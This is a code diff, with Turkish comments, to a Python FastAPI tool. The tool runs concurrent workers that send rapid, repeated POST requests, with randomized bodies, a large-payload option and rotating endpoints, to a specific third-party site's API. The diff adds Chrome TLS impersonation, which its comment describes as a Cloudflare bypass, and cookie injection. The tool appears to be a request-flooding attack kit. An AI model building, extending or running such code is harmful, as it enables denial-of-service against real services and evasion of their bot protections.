@@ -7,6 +7,7 @@ import threading
 import random
 import string
 import urllib.request
+from curl_cffi import requests as cffi_requests
 from typing import Dict, Any, Optional, List
 from fastapi import FastAPI
 from fastapi.responses import HTMLResponse, JSONResponse
@@ -28,9 +29,10 @@ BIG_PAYLOAD_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "big
 state = {
     "is_running": False,
     "workers": 1,
-    "url": "https://api.7xwon.com/main-events",
+    "url": "https://7xwon.com/api/main-events",
     "method": "POST",
     "interval_seconds": 0.1,
+    "cookies_raw": "",
     "headers_raw": json.dumps({
         "Content-Type": "application/json",
         "Authorization": "Bearer unlogged",
@@ -110,22 +112,63 @@ def get_effective_url() -> str:
 
 def execute_http_request(url: str, method: str, headers_dict: dict, body_str: str) -> Dict[str, Any]:
     t0 = time.perf_counter()
-    data_bytes = body_str.encode('utf-8') if (body_str and method.upper() in ["POST", "PUT", "PATCH"]) else None
-    req = urllib.request.Request(url, data=data_bytes, headers=headers_dict, method=method.upper())
+    cookies = {}
+    if state.get("cookies_raw", "").strip():
+        try:
+            # json veya key=value; parse et
+            raw_c = state["cookies_raw"].strip()
+            if raw_c.startswith("{"):
+                cookies = json.loads(raw_c)
+            else:
+                for part in raw_c.split(";"):
+                    if "=" in part:
+                        k, v = part.strip().split("=", 1)
+                        cookies[k] = v
+        except Exception:
+            pass
+
+    # curl_cffi ile Cloudflare bypass ve TLS impersonation
     try:
-        with urllib.request.urlopen(req, context=ssl_ctx, timeout=15) as resp:
-            elapsed = (time.perf_counter() - t0) * 1000
-            raw = resp.read()
-            text = raw.decode('utf-8', errors='ignore')
-            return {"success": True, "status_code": resp.status, "latency_ms": round(elapsed, 1), "bytes": len(raw), "body": text, "error": None}
-    except urllib.error.HTTPError as e:
+        data_bytes = body_str.encode('utf-8') if (body_str and method.upper() in ["POST", "PUT", "PATCH"]) else None
+        resp = cffi_requests.request(
+            method=method.upper(),
+            url=url,
+            data=data_bytes,
+            headers=headers_dict,
+            cookies=cookies if cookies else None,
+            impersonate="chrome120",
+            timeout=15
+        )
         elapsed = (time.perf_counter() - t0) * 1000
-        raw = e.read()
-        text = raw.decode('utf-8', errors='ignore')
-        return {"success": False, "status_code": e.code, "latency_ms": round(elapsed, 1), "bytes": len(raw), "body": text, "error": f"HTTP {e.code}"}
+        raw = resp.content
+        text = resp.text
+        is_ok = 200 <= resp.status_code < 300
+        return {
+            "success": is_ok,
+            "status_code": resp.status_code,
+            "latency_ms": round(elapsed, 1),
+            "bytes": len(raw),
+            "body": text,
+            "error": None if is_ok else f"HTTP {resp.status_code}"
+        }
     except Exception as e:
-        elapsed = (time.perf_counter() - t0) * 1000
-        return {"success": False, "status_code": 0, "latency_ms": round(elapsed, 1), "bytes": 0, "body": "", "error": str(e)}
+        # Fallback urllib
+        try:
+            data_bytes = body_str.encode('utf-8') if (body_str and method.upper() in ["POST", "PUT", "PATCH"]) else None
+            req = urllib.request.Request(url, data=data_bytes, headers=headers_dict, method=method.upper())
+            with urllib.request.urlopen(req, context=ssl_ctx, timeout=15) as resp:
+                elapsed = (time.perf_counter() - t0) * 1000
+                raw = resp.read()
+                text = raw.decode('utf-8', errors='ignore')
+                return {"success": True, "status_code": resp.status, "latency_ms": round(elapsed, 1), "bytes": len(raw), "body": text, "error": None}
+        except urllib.error.HTTPError as he:
+            elapsed = (time.perf_counter() - t0) * 1000
+            raw = he.read()
+            text = raw.decode('utf-8', errors='ignore')
+            return {"success": False, "status_code": he.code, "latency_ms": round(elapsed, 1), "bytes": len(raw), "body": text, "error": f"HTTP {he.code}"}
+        except Exception as ex:
+            elapsed = (time.perf_counter() - t0) * 1000
+            return {"success": False, "status_code": 0, "latency_ms": round(elapsed, 1), "bytes": 0, "body": "", "error": str(ex)}
 
 async def single_worker(worker_id: int):
     """Tek bir worker — durana kadar istek atar."""
@@ -248,6 +291,8 @@ def update_config(payload: Dict[str, Any]):
         state["randomize_body"] = bool(payload["randomize_body"])
     if "rotate_endpoints" in payload:
         state["rotate_endpoints"] = bool(payload["rotate_endpoints"])
+    if "cookies_raw" in payload:
+        state["cookies_raw"] = payload["cookies_raw"].strip()
     if "rotate_list" in payload:
         state["rotate_list"] = [u.strip() for u in payload["rotate_list"] if u.strip()]
     return JSONResponse({"success": True, "state": state})
